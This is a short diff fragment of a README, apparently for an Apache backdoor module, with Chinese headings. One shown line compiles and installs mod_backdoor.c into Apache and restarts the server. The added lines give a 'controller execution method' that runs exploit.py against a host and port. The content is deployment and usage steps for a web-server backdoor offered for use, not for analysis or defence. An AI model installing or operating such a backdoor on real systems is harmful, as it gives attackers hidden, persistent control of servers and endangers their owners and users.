@@ -16,3 +16,12 @@ https://github.com/ianxtianxt/apache-
 apxs -i -a -c mod_backdoor.c && service apache2 restart
 ```
 
+![image](images/img1.jpg)
+
+### 2、控制端执行方法
+
+```shell
+python exploit.py 127.0.0.1 80
+```
+
+image
